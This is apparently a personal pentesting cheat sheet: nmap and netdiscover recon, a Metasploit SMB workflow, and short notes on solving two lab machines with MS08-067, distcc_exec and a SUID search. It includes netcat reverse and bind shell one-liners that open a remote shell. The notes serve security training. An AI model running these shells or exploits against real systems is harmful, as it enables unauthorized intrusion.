### Host files from current dir 
` python -m SimpleHttpServer 8080 `
 
### enable postgress for faster msf startup 
systemctl enable postgresql

### python tools for network 
https://github.com/SecureAuthCorp/impacket

### Given a string, cut at delimiter ( space) and take 4th field as a result
cut -d " " -f 4  

## Recon

### Website tech identification
whatweb - Kali cli tool for identifying site ( better than most)
Wappalyzer - extension on browser

### netdiscover - arp in the network

netdiscover -r 192.168.88.0/24

### nmap
-sS - "Stealh scan" (not really , just syn, synack and RST - no sessions established) 
nmap -sS 192.168.88.128
nmap -T4 -p- -A
-p- - all ports  ( default is top 1000 ports) ;   -A - scan everything , version, OS, fingerprint

### SMB (and metasploit workflow)

msfconsole
search smb 
use auxiliary/scanner/smb/smb_version 
set RHOSTS 192.168.88.128
run

### nice to knows 
dpkg -i downloaded_package.deb  # install a package

### reverse shell ( just like pentestmonkey )
nc 192.168.1.1 4444 -e /bin/sh        --->   nc -lvp 4444

### bind shell 
nc 192.168.1.1 4444     ---->  nc -lvp 4444 -e /bin/sh

### Foxyproxy productivity 
use foxyproxy addon and add burpsuite settings to it. easy switching 


## Legacy
nmap -sS -p- 10.10.10.4 
nmap -A -p139,445,3389 10.10.10.4
nmap --script vuln -p445 10.10.10.4    ( looked at write-up for this to scan for vulns )
Find MS08-067(works) and  ms17-010(doesnt work)   Eternalblue.
search -f user.txt    , same for root. gg

## Lame
nmap --script vuln -p3632 10.10.10.3
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
distcc indicated as vulnerable, msf unix/misc/distcc_exec gives shell
find / -user root -perm -4000 -print 2>/dev/null      ( find binaries with root privs) 
elevate privileges with nmap ( should learn something new instead...)
https://pentestlab.blog/category/privilege-escalation/  

